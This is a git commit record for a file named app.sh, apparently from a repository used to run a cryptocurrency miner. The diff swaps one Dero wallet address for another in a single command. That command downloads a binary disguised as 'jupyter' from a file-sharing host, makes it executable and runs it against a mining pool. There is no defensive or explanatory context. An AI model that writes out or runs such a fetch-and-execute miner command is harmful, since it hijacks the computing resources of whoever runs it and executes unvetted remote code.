2b519a8cf6181882cbd529321118084e939c8dfa
joykotest <106002787+joykotest@users.noreply.github.com>
2022-10-18 14:45:10 +0700

    Update app.sh

--- app.sh
+++ app.sh
@@ -1,1 +1,1 @@
-wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r pool.whalesburg.com:4300 -w dero1qy5ej3leuegvztetxpv9f3v8z60alq0p3s2gkz0kswh2hd5w3gz72qgs4dzvk
+wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r pool.whalesburg.com:4300 -w dero1qy3k9h7fuw3ky9v8g4c4urs5s8c6gafqtmy2xfju98ty483kgyyy5qg4effk0.Ajurexx-55xxA
